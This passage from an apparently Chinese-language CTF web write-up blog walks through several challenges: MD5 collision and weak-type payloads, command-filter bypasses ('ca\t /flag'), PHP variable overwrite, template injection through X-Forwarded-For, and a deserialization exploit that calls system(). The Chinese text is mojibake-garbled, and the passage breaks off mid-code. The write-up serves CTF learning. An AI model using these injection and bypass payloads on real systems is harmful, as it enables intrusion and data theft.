class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span>param<span class="hljs-number">2</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span></code></pre></div><p><code>if (!is_numeric($passwd))</code>å¼±ç±»å‹æ¯”è¾ƒï¼Œä½¿ç”¨1234567aç»•è¿‡</p><p>payload:</p><div class="hljs"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%00</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1U</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>&amp;gg=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%02</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>POST:passwd=<span class="hljs-number">1234567</span>aæˆ–è€…<span class="hljs-built_in">?id</span>[]=<span class="hljs-number">1</span>&amp;gg[]=<span class="hljs-number">2</span>POST:passwd=<span class="hljs-number">1234567</span>a</code></pre></div><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>urlä¸­åŒ…å«<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>ï¼Œä»”ç»†çœ‹<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>å…¶å®æ˜¯base64ç¼–ç ï¼Œè§£ç è¿˜æ˜¯base64ï¼Œç»§ç»­è§£ç ä¸ºä¸€ä¸²åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œå†…å®¹ä¸º555.png</p><p>é€šè¿‡<code>555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0</code>å¯ä»¥ç±»å‹çš„æ„é€ å‡ºindex.phpæŸ¥è¯¢ä»£ç </p><div class="hljs"><pre><code class="hljs angelscript">index.php<span class="hljs-number">696e6465782</span>e706870Njk2ZTY0NjU3ODJlNzA2ODcwTmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div><p><img src="https://i.loli.net/2020/10/24/vQ5dSRXbJZ6Yagn.png" srcset="/img/loading.gif" alt="web-4.png"></p><p><img src="https://i.loli.net/2020/10/24/ZfMW62Ik1L5adpz.png" srcset="/img/loading.gif" alt="web-1.png"></p><p>base64è§£ç å</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(E_ALL || ~ E_NOTICE);header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);$cmd = $_GET[<span class="hljs-string">'cmd'</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))     header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiÃ¯Â½Â no flag"</span>);&#125; <span class="hljs-keyword">else</span> &#123;    $txt = base64_encode(file_get_contents($file));    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>; <span class="hljs-comment">//å°†555.pngçš„å†…å®¹ä»¥base64å½¢å¼æ˜¾ç¤º</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;&#125;<span class="hljs-keyword">echo</span> $cmd;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123; <span class="hljs-comment">//cmdå‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;<span class="hljs-comment">// md5å¼ºç¢°æ’</span>        <span class="hljs-keyword">echo</span> `$cmd`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:<span class="hljs-comment">#CCCCCC;</span>&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));<span class="hljs-comment">//è¿™é‡Œå°†imgçš„å€¼ä¸¤æ¬¡base64è§£ç åèµ‹å€¼ç»™äº†fileå˜é‡</span>...$txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//è¿™é‡Œå­˜åœ¨file_get_contents()å‡½æ•°ï¼Œç›´æ¥è¯»å–æ–‡ä»¶çš„å†…å®¹</span></code></pre></div><p>è¿™é¢˜è¿˜å¯¹ä¸€äº›ç³»ç»Ÿå‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡</p><p>lsï¼Œä¸å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯diræ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨<code>dir%20/</code>è¯»å–ç›®å½•</p><p>catè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>ca\t</code>ç»•è¿‡ï¼Œ<code>ca\t%20/flag</code></p><p><strong>(linuxå‘½ä»¤ä¸­å¯ä»¥åŠ )</strong></p><div class="hljs"><pre><code class="hljs lisp">if ((<span class="hljs-name">string</span>)$_POST['a'] !== (<span class="hljs-name">string</span>)$_POST['b'] <span class="hljs-symbol">&amp;&amp;</span> md5($_POST['a']) === md5($_POST['b']))</code></pre></div><p>md5å¼ºç¢°æ’çš„å­—ç¬¦ä¸²</p><div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div><p><img src="https://i.loli.net/2020/10/24/N5pyKHGSTAYas3n.png" srcset="/img/loading.gif" alt="web-2.png"></p><p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p><p>å‚è€ƒï¼š <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>å˜é‡è¦†ç›–</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;$yds = <span class="hljs-string">"dog"</span>;$is = <span class="hljs-string">"cat"</span>;$handsome = <span class="hljs-string">'yds'</span>;<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>    $$x = $y;&#125;$flag = flag <span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>        <span class="hljs-keyword">exit</span>($handsome);    &#125;&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;    <span class="hljs-keyword">exit</span>($yds);&#125;<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;    <span class="hljs-keyword">exit</span>($is);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div><p>poyload:</p><div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flagPOST: <span class="hljs-variable">$flag</span>=flag</code></pre></div><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>è¿›å…¥é¡µé¢ä¸çŸ¥é“å¹²å•¥ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œåˆ°flag.phpæ—¶æ˜¾ç¤ºäº†IPåœ°å€</p><p>æŸ¥çœ‹åŸç å‘ç°æç¤º<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p><p>çŒœæµ‹è¿™é‡Œæ˜¯è·ŸXFFæœ‰å…³ï¼Œäºæ˜¯ä¿®æ”¹XFF:127.0.0.1ï¼Œæœç„¶é¡µé¢æ˜¾ç¤ºçš„å°±æ˜¯IPæ˜¯127.0.0.1</p><p>è¿™é‡Œå°±æƒ³åˆ°äº†XFFæ³¨å…¥ï¼Œæ˜¯å¦å¯ä»¥ç±»ä¼¼äºXFFæ³¨å…¥ï¼Œå°†ç³»ç»Ÿåä»¤æ³¨å…¥è¿›å»</p><p>é¦–å…ˆè¯•è¯•<code>system(&quot;ls /&quot;)</code>,ä½†æ˜¯å‘ç°æ²¡æœ‰è¢«æ‰§è¡Œï¼Œäºæ˜¯å®¶ä¸Šæ‹¬å·<code>{system(&quot;ls /&quot;)}</code>ï¼Œè¿™æ¬¡æ‰§è¡ŒæˆåŠŸ</p><p><img src="https://i.loli.net/2020/10/24/EGtFP2INmuhgroY.png" srcset="/img/loading.gif" alt="ip-1.png"></p><p>æœ€åè·å–flag, <code>{system(cat /flag)}</code></p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;        $result = call_user_func($func, $p);        $a= gettype($result);        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">"string"</span>) &#123;            <span class="hljs-keyword">return</span> $result;        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;&#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[<span class="hljs-string">"func"</span>];    $p = $_REQUEST[<span class="hljs-string">"p"</span>];    <span class="hljs-keyword">if</span> ($func != <span class="hljs-keyword">null</span>) &#123;        $func = strtolower($func);        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;            <span class="hljs-keyword">echo</span> gettime($func, $p);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Hacker..."</span>);        &#125;    &#125;    <span class="hljs-meta">?&gt;</span></code></pre></div><p>exp</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);            &#125;        &#125;    &#125;$a = <span class="hljs-keyword">new</span> Test();$a-&gt;p=<span class="hljs-string">"cat /tmp/flagoefiu4r93"</span>;$a-&gt;func=<span class="hljs-string">"system"</span>;<span class="hljs-keyword">print</span>(urlencode(serialize($a)));<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><span class="hljs-comment">#encoding=utf-8</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> jsonreload(sys)sys.setdefaultencoding(<span class="hljs-string">'latin1'</span>)app = Flask(__name__)secert_key = os.urandom(<span class="hljs-number">16</span>)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, action, param, sign, ip)</span>:</span>        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)): <span class="hljs-comment">#SandBox For Remote_Addr</span>            os.mkdir(self.sandbox)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(self)</span>:</span>        result = &#123;&#125;        result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>        <span class="hljs-keyword">if</span> (self.checkSign()):            <span class="hljs-keyword">if</span> <span class="hljs-string">"scan"</span> <span class="hljs-keyword">in</span> self.action:                tmpfile = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'w'</span>)                resp = scan(self.param)                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">"Connection Timeout"</span>):                    result[<span class="hljs-string">'data'</span>] = resp                <span class="hljs-keyword">else</span>:                    <span class="hljs-keyword">print</span> resp                    tmpfile.write(resp)                    tmpfile.close()                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">"read"</span> <span class="hljs-keyword">in</span> self.action:                f = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'r'</span>)                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>                result[<span class="hljs-string">'data'</span>] = f.read()            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">500</span>:                result[<span class="hljs-string">'data'</span>] = <span class="hljs-string">"Action Error"</span>        <span class="hljs-keyword">else</span>:            result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>            result[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">"Sign Error"</span>        <span class="hljs-keyword">return</span> result    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-comment">#generate Sign For Action Scan.</span><span class="hljs-meta">@app.route("/geneSign", methods=['GET', 'POST'])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span>:</span>    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))    action = <span class="hljs-string">"scan"</span>    <span class="hljs-keyword">return</span> getSign(action, param)<span class="hljs-meta">@app.route('/De1ta',methods=['GET','POST'])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span>:</span>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">"action"</span>))    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">"sign"</span>))    ip = request.remote_addr    <span class="hljs-keyword">if</span>(waf(param)):        <span class="hljs-keyword">return</span> <span class="hljs-string">"No Hacker!!!!"</span>    task = Task(action, param, sign, ip)    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<span class="hljs-meta">@app.route('/')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"code.txt"</span>,<span class="hljs-string">"r"</span>).read()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span>:</span>    